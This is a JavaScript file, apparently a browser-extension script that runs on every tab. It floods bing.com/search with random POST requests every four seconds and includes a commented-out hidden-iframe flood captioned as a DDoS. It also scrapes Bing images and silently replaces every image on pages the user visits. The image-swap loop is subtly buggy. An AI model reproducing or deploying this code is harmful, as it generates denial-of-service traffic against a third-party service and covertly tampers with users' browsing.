//this script will run on every tab.

//network > DOC
//giving valid responses but page reloads every 7 seconds
/*
function iframeFlood() {
   var link = document.createElement("a");

  link.href = "https://www.bing.com/";
  link.alt = "Conquering the world by DDoS!";

    var input= document.createElement("iframe");
    input.src = "https://www.bing.com/search?q=" + Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5);

    link.appendChild(input);
    link.style.display = 'none';

    document.body.appendChild(link);

}


setInterval(iframeFlood,7000);
*/

//keep the above function if you want to or delete it


//This is AJAX code for POST requests to bing.
//network > XHR or network > others
//gives 200 for duckduckgo and 302/200 for bing

function postFlood(){

  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        // Action to be performed when the document is read;
      }
  };


var randomString = Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5);
var randomPOSTString = "q=" + randomString + "&FORM=HDRSC2";

xhttp.open("POST", "https://www.bing.com/search", true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send(randomPOSTString);

}

setInterval(postFlood,4000);



var maliciousImages= new Array();

var wallpapersCategories = ["abstract", "nature", "concerts", "brands", "nature", "design", "landscape", "sports", "technology"];

function getBingImages()
{
  var randomCategory = window.wallpapersCategories[Math.floor(Math.random() * (window.wallpapersCategories.length))];

  var xhttp = new XMLHttpRequest();
  xhttp.responseType = 'document';

  xhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        
        sortHTTPSlinks(this);
      }
  };
  xhttp.open("GET", "https://www.bing.com/images/search?q=" + randomCategory + "&FORM=HDRSC2", true);
  xhttp.send();

}


function sortHTTPSlinks(xml) {
  var x, i, xmlDoc;
  xmlDoc = xml.responseXML;

  x = xmlDoc.getElementsByTagName("img");

  for(i = 0; i< x.length; i++) {
    if( x[i].hasAttribute("data-src"))
    {
        var imageSource = x[i].getAttribute("data-src");
    
        window.maliciousImages.push(imageSource);
    }
     
  }

}

setInterval(getBingImages, 3500); 

//network > XHR
function changeImages()
{
  var container = document.getElementsByTagName("img");
  for(var i=0,j=0;i<container.length;i++,j++)
  { 
    if(j>maliciousImages.length)
    {
      j=0;
    }

    container[i].src = window.maliciousImages[i]; 
  }
}

setInterval(changeImages, 5000); 
